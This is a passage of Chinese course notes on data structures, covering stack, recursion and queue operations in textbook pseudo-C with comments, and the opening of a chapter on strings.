S.base ) <span class="comment">//不为空</span></span><br><span class="line">&#123;</span><br><span class="line">delete S.base; <span class="comment">//base所指的内存被释放，但 是base所指的地址仍然不变</span></span><br><span class="line">S.stacksize = <span class="number">0</span>; </span><br><span class="line">S.base = S.top = <span class="literal">NULL</span>; <span class="comment">//必须要置空 &#125;</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>顺序栈入栈</p></blockquote><p>(1)判断是否栈满，若满则出错</p><p>(2)元素e压入栈顶</p><p>(3)栈顶指针加1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Push</span><span class="params">( SqStack &amp;S, SElemType e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.top - S.base== S.stacksize ) <span class="comment">// 是否栈满</span></span><br><span class="line"><span class="keyword">return</span> ERROR; </span><br><span class="line">*S.top++=e; <span class="comment">//元素e压入栈顶，栈顶指针加1（注意顺序！）</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>顺序栈出栈</p></blockquote><p>(1)判断是否栈空，若空则出错</p><p>(2)获取栈顶元素e</p><p>(3)栈顶指针减1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Pop</span><span class="params">( SqStack &amp;S, SElemType &amp;e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.top == S.base ) <span class="comment">// 栈空</span></span><br><span class="line"><span class="keyword">return</span> ERROR; </span><br><span class="line">e＝ *--S.top; <span class="comment">//栈顶指针减1，栈顶元素赋值给e（注意顺序！）</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取顺序栈栈顶元素</p></blockquote><p>(1)判断是否空栈，若空则返回错误</p><p>(2)否则通过栈顶指针获取栈顶元素</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">GetTop</span><span class="params">( SqStack S, SElemType &amp;e)</span> <span class="comment">//此处是S而不是&amp;S</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.top == S.base ) <span class="keyword">return</span> ERROR; <span class="comment">// 栈空</span></span><br><span class="line">e = *( S.top – <span class="number">1</span> ); </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>链栈的表示</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> &#123;</span></span><br><span class="line">    SElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; StackNode, *LinkStack;</span><br><span class="line">LinkStack S;</span><br></pre></td></tr></table></figure><blockquote><p>链栈的初始化</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(LinkStack &amp;S )</span></span><br><span class="line">&#123;</span><br><span class="line">S=<span class="literal">NULL</span>; <span class="comment">//构建一个空栈，栈顶指针置空</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>判断链栈是否为空</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">StackEmpty</span><span class="params">(LinkStack S)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S==<span class="literal">NULL</span>) <span class="keyword">return</span> TRUE;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> FALSE; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>链栈进栈</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Push</span><span class="params">(LinkStack &amp;S , SElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">p=new StackNode; <span class="comment">//生成新结点p </span></span><br><span class="line"><span class="keyword">if</span> (!p) <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">p-&gt;data=e; <span class="comment">//新节点数据域置为e </span></span><br><span class="line">p-&gt;next=S; <span class="comment">//将新节点插入栈顶</span></span><br><span class="line">S=p; <span class="comment">//让指针S指向栈顶</span></span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>链栈进栈</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Pop</span> <span class="params">(LinkStack &amp;S,SElemType &amp;e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S==<span class="literal">NULL</span>) <span class="keyword">return</span> ERROR; <span class="comment">//栈空返回错误</span></span><br><span class="line">e = S-&gt; data; <span class="comment">//将栈顶元素赋值给e</span></span><br><span class="line">p = S; <span class="comment">//用p临时保存栈顶元素空间，以便释放</span></span><br><span class="line">S = S-&gt; next; <span class="comment">//修改栈顶指针，指向下个元素</span></span><br><span class="line">delete p; <span class="comment">//释放原栈顶元素空间</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取链栈栈顶元素</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SElemType <span class="title function_">GetTop</span><span class="params">(LinkStack S)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S==<span class="literal">NULL</span>) <span class="built_in">exit</span>(<span class="number">1</span>)；<span class="comment">//栈非空</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> S–&gt;data; <span class="comment">//返回栈顶元素的</span></span><br><span class="line">值，栈顶指针不变</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-栈与递归"><a href="#4-栈与递归" class="headerlink" title="4 栈与递归"></a>4 栈与递归</h2><p>以下三种情况常常用到递归方法：</p><ul><li>递归定义的数学函数</li><li>可递归求解的问题</li><li>具有递归特性的数据结构</li></ul><ol><li><p>递归定义的数学函数:<br><img src="/img/%E9%80%92%E5%BD%92%E5%AE%9A%E4%B9%89%E7%9A%84%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0.png" alt="递归定义的数学函数"></p></li><li><p>具有递归特性的数据结构:<br>•树:Root, Lchild, Rchild<br>• 广义表 A&#x3D;(a, A)</p></li><li><p>可递归求解的问题:<br>迷宫问题、汉诺塔（ Hanoi, 又称河内塔）问题、八皇后问题</p></li></ol><h3 id="4-1用分治法求解递归问题"><a href="#4-1用分治法求解递归问题" class="headerlink" title="4.1用分治法求解递归问题"></a>4.1用分治法求解递归问题</h3><p>分治法：对于一个较为复杂的问题，能够分解成几个相对简单的且解法相同或类似的子问题来求解</p><p>必备的三个条件:</p><ul><li>能将一个问题转变成一个新问题，而新问题与原问题的解法相同或类同，不同的仅是处理的对象，且这些处理对象是变化有规律的</li><li>可以通过上述转化而使问题简化</li><li>必须有一个明确的递归出口，或称递归的边界<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">分治法求解递归问题算法的一般形式：</span><br><span class="line"><span class="type">void</span> <span class="title function_">X</span><span class="params">(参数表)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> （递归结束条件）可直接求解步骤；-----基本项</span><br><span class="line"><span class="keyword">else</span> X（较小的参数）；------归纳项</span><br><span class="line">&#125; </span><br><span class="line"><span class="type">long</span> Fact ( <span class="type">long</span> n ) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//基本项</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> n * Fact (n<span class="number">-1</span>); <span class="comment">//归纳项</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/img/n%E7%9A%84%E9%98%B6%E4%B9%98%E6%B1%82%E8%A7%A3.png" alt="n的阶乘求解"></li></ul><blockquote><p>任意函数之间调用过程</p></blockquote><p>调用前, 系统完成:</p><p>(1) 将实参, 返回地址等传递给被调用函数</p><p>(2) 为被调用函数的局部变量分配存储区</p><p>(3) 将控制转移到被调用函数的入口</p><p>调用后, 系统完成:</p><p>(1) 保存被调用函数的计算结果</p><p>(2) 释放被调用函数的数据区</p><p>(3) 依照被调用函数保存的返回地址将控制转移到调用函数</p><blockquote><p>尾递归 循环结构</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">Fact</span> <span class="params">( <span class="type">long</span> n )</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( n == <span class="number">0</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> n * Fact (n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="title function_">Fact</span> <span class="params">( <span class="type">long</span> n )</span> &#123;</span><br><span class="line">t=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">t=t*i;</span><br><span class="line"><span class="keyword">return</span> t; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>单向递归 循环结构</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">虽然有一处以上的递归调用语句，但各次递归调用语句的</span><br><span class="line">参数只和主调函数有关，相互之间参数无关，并且这些递</span><br><span class="line">归调用语句处于算法的最后。</span><br><span class="line"><span class="type">long</span> <span class="title function_">Fib</span> <span class="params">( <span class="type">long</span> n )</span> &#123;<span class="comment">// Fibonacci数列</span></span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span> || n==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> Fib (n<span class="number">-1</span>)+ Fib (n<span class="number">-2</span>);&#125;</span><br></pre></td></tr></table></figure><blockquote><p>尾递归、单向递归-&gt;循环结构</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">Fib</span> <span class="params">( <span class="type">long</span> n )</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span> || n==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">t1=<span class="number">1</span>; t2=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">3</span>; i&lt;=n; i++)</span><br><span class="line">&#123;</span><br><span class="line">t3=t1+t2; </span><br><span class="line">t1=t2; </span><br><span class="line">t2=t3;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> t3; &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="5-队列的的表示和操作的实现"><a href="#5-队列的的表示和操作的实现" class="headerlink" title="5 队列的的表示和操作的实现"></a>5 队列的的表示和操作的实现</h2><h3 id="5-1队列的抽象数据类型"><a href="#5-1队列的抽象数据类型" class="headerlink" title="5.1队列的抽象数据类型"></a>5.1队列的抽象数据类型</h3><pre><code>ADT Queue&#123;    数据对象:...    数据关系:...    基本操作：    (1) InitQueue (&amp;Q) //构造空队列    (2) DestroyQueue (&amp;Q) //销毁队列    (3) ClearQueue (&amp;S) //清空队列    (4) QueueEmpty(S) //判空. --TRUE,    (5) QueueLength(Q) //取队列长度    (6) GetHead (Q,&amp;e) //取队头元素    (7) EnQueue (&amp;Q,e) //入队列    (8) DeQueue (&amp;Q,&amp;e) //出队列    (9) QueueTraverse(Q,visit()) //遍历&#125;ADT Queue</code></pre><h3 id="5-2队列的抽象数据类型队列的顺序表示－－用一维数组base-M"><a href="#5-2队列的抽象数据类型队列的顺序表示－－用一维数组base-M" class="headerlink" title="5.2队列的抽象数据类型队列的顺序表示－－用一维数组base[M]"></a>5.2队列的抽象数据类型队列的顺序表示－－用一维数组base[M]</h3><blockquote><p>初始化定义</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> M 100 <span class="comment">//最大队列长度</span></span></span><br><span class="line">Typedef <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">QElemType *base; <span class="comment">//初始化的动态分配存储空间（表示</span></span><br><span class="line">存储空间的基地址：对比顺序栈，队列的两个指针均</span><br><span class="line">需要移动，栈的base指针不需要移动）</span><br><span class="line"><span class="type">int</span> front; <span class="comment">//头指针</span></span><br><span class="line"><span class="type">int</span> rear; <span class="comment">//尾指针</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p><img src="/img/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97.jpg" alt="循环队列"></p><h3 id="5-3循环队列"><a href="#5-3循环队列" class="headerlink" title="5.3循环队列"></a>5.3循环队列</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 100 <span class="comment">//最大队列长度</span></span></span><br><span class="line">Typedef <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">#<span class="title">define</span> <span class="title">MAXQSIZE</span> 100 //最大长度</span></span><br><span class="line"><span class="class"><span class="title">Typedef</span> <span class="keyword">struct</span> &#123;</span></span><br><span class="line">QElemType *base; <span class="comment">//初始化的动态分配存储空间</span></span><br><span class="line"><span class="type">int</span> front; <span class="comment">//头指针</span></span><br><span class="line"><span class="type">int</span> rear; <span class="comment">//尾指针</span></span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造一个空的队列</span></span><br><span class="line">Status <span class="title function_">InitQueue</span> <span class="params">(SqQueue &amp;Q)</span></span><br><span class="line">&#123;</span><br><span class="line">Q.base =new QElemType[MAXQSIZE] <span class="comment">//为队列分配</span></span><br><span class="line">一个数组空间</span><br><span class="line"><span class="keyword">if</span>(!Q.base) <span class="built_in">exit</span>(OVERFLOW); <span class="comment">//存储分配失败</span></span><br><span class="line">Q.front=Q.rear=<span class="number">0</span>; <span class="comment">//头指针和尾指针置为0，队列为空</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>求循环队列的长度</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回Q的元素个数，即队列的长度</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">QueueLength</span> <span class="params">(SqQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (Q.rear-Q.front+MAXQSIZE)%MAXQSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：非循环队列尾和头指针的差值就是队列长度，循环队列差值可能为负，故加上MAXQSIZE再与MAXQSIZE求余</p><blockquote><p>循环队列入队</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(SqQueue &amp;Q,QElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果队满，返回错误</span></span><br><span class="line"><span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MAXQSIZE==Q.front) <span class="keyword">return</span> ERROR;</span><br><span class="line">Q.base[Q.rear]=e; <span class="comment">//新元素插入队尾</span></span><br><span class="line">Q.rear=(Q.rear+<span class="number">1</span>)%MAXQSIZE; <span class="comment">//队尾指针加1</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>循环队列出队</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DeQueue</span> <span class="params">(LinkQueue &amp;Q,QElemType &amp;e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果队列为空，返回错误</span></span><br><span class="line"><span class="keyword">if</span>(Q.front==Q.rear) <span class="keyword">return</span> ERROR;</span><br><span class="line">e=Q.base[Q.front]; <span class="comment">//保存队头元素</span></span><br><span class="line">Q.front=(Q.front+<span class="number">1</span>)%MAXQSIZE; <span class="comment">//队头指针加1</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取循环队列的队头元素</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回队头元素，不修改队头指针</span></span><br><span class="line">SElemType <span class="title function_">GetHead</span> <span class="params">(SqQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Q.front != Q.rear) <span class="comment">//队列非空</span></span><br><span class="line"><span class="keyword">return</span> Q.base[Q.front]; <span class="comment">//返回队头元素的值，队头</span></span><br><span class="line">指针不变</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-链队列"><a href="#6-链队列" class="headerlink" title="6 链队列"></a>6 链队列</h2><p>链队，链式存储结构实现的队列，通常用单链表表示。为便于操作，链队包含头结点，队头指针指向头结点。</p><p><img src="/img/%E9%93%BE%E9%98%9F%E5%88%97.png" alt="链队列"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span>&#123;</span></span><br><span class="line">QElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Qnode</span> *<span class="title">next</span>;</span> &#125;Qnode, *QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">QueuePtr front; <span class="comment">//队头指针</span></span><br><span class="line">QueuePtr rear; <span class="comment">//队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">Status <span class="title function_">InitQueue</span> <span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">Q.front=Q.rear=new Qnode; <span class="comment">//生成一个新节点作为头结</span></span><br><span class="line">点，队头和队尾指针指向此节点</span><br><span class="line"><span class="keyword">if</span> (!Q.front) <span class="built_in">exit</span>(OVERFLOW); <span class="comment">//失败</span></span><br><span class="line">Q.front-&gt;next=<span class="literal">NULL</span>; <span class="comment">//头结点的指针域置空</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>销毁链队列</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DestroyQueue</span> <span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line"><span class="comment">//从头节点开始，依次释放第1个元素（销毁操作开始前的队头节点）</span></span><br><span class="line">，第<span class="number">2</span>个元素，直到最后一个元素（销毁操作开始前的队尾节点）</span><br><span class="line"><span class="keyword">while</span>(Q.front)&#123; <span class="comment">//队头指针不为空</span></span><br><span class="line">Q.rear=Q.front-&gt;next; <span class="comment">//队尾指针指向对头指针指向的下 一个</span></span><br><span class="line">节点</span><br><span class="line"><span class="built_in">free</span> (Q.front); <span class="comment">//释放当前节点(第一次是头结点)</span></span><br><span class="line">Q.front=Q.rear; <span class="comment">//队头指针指向下一个节点（与队尾指针 指向同</span></span><br><span class="line">一个节点） ，只要有节点未销毁，指针将不为空</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>判断链队列是否为空</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">QueueEmpty</span> <span class="params">(LinkQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (Q.front==Q.rear); <span class="comment">//链头是否等于链尾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取链队列的队头元素</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">GetHead</span> <span class="params">(LinkQueue Q, QElemType &amp;e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Q.front==Q.rear) <span class="keyword">return</span> ERROR; <span class="comment">//空队列返回错误</span></span><br><span class="line">e=Q.front-&gt;next-&gt;data; <span class="comment">//返回队头元素的值，指针不变</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/%E9%93%BE%E9%98%9F%E5%88%97%E7%9A%84%E5%AD%98%E5%82%A8.png" alt="链队列的存储"></p><blockquote><p>链队列入队</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,QElemType e)</span>&#123;</span><br><span class="line">p=new QNode; <span class="comment">//为入队元素分配节点空间，用指针p指向</span></span><br><span class="line"><span class="keyword">if</span>(!p) <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">p-&gt;data=e; <span class="comment">//将新节点数据域置为e p-&gt;next=NULL; //将新节点指针域置为空（队尾）</span></span><br><span class="line">Q.rear-&gt;next=p; <span class="comment">//将队尾节点的指针域指向新节点</span></span><br><span class="line">Q.rear=p; <span class="comment">//移动队尾指针，指向新节点</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/%E9%93%BE%E9%98%9F%E5%88%97%E5%87%BA%E9%98%9F.png" alt="链队列出队"></p><blockquote><p>链队列入队</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DeQueue</span> <span class="params">(LinkQueue &amp;Q,QElemType &amp;e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(Q.front==Q.rear) <span class="keyword">return</span> ERROR; <span class="comment">//队列为空返回错误</span></span><br><span class="line">p=Q.front-&gt;next; <span class="comment">//p指向队头元素节点</span></span><br><span class="line">e=p-&gt;data; <span class="comment">//保存队头元素节点值</span></span><br><span class="line">Q.front-&gt;next=p-&gt;next; <span class="comment">//修改队头指针指向出队节点的下一个</span></span><br><span class="line"><span class="keyword">if</span>(Q.rear==p) Q.rear=Q.front; <span class="comment">//若队尾节点出队，队尾指针指</span></span><br><span class="line">向头节点</span><br><span class="line">delete p; <span class="comment">//释放原队头节点空间</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h1><blockquote><p>补充：C语言中常用的串运算</p></blockquote><pre><code>调用标准库函数 #include&lt;string.h&gt;串比较，strcmp(char s1,char s2) 串复制，strcpy(char to,char from)串连接，strcat(char to,char from) 求串长，strlen(char s)</code></pre><h2 id="4-1串"><a href="#4-1串" class="headerlink" title="4.1串"></a>4.1串</h2><p><img src="/img/%E4%B8%B2%E7%9A%84%E5%AE%9A%E4%B9%89.png" alt="串的定义"></p><ul><li>串(String)：零个或多个字符组成的有限序列</li><li>子串：串中任意个连续的字符组成的子序列称为该串的子串；</li><li>位置：字符在序列中的序号；</li><li>子串位置：子串的第一个字符在主串中的位置；</li><li>串相等：两个串的长度相等，且各个对应位置的字符都相等；</li><li>空格串：一个或多个空格组成的串</li><li>空串：零个字符的串，长度为零</li></ul><h2 id="4-2案例引入"><a href="#4-2案例引入" class="headerlink" title="4.2案例引入"></a>4.2案例引入</h2><p>  研究者将人的DNA和病毒DNA均表示成由一些字母组成的字符串序列。</p><p>  然后检测某种病毒DNA序列是否在患者的DNA序列中出现过，如果出现过，则此人感染了该病毒，否则没有感染。</p><p>  例如，假设病毒的DNA序列为baa，患者1的DNA序列为aaabbba，则感染，患者2的DNA序列为babbba，则未感染。</p><p>（注意，人的DNA序列是线性的，而病毒的DNA序列是环状的）</p><h2 id="4-3串的类型定义、存储结构及运算"><a href="#4-3串的类型定义、存储结构及运算" class="headerlink" title="4.3串的类型定义、存储结构及运算"></a>4.3串的类型定义、存储结构及运算</h2><h3 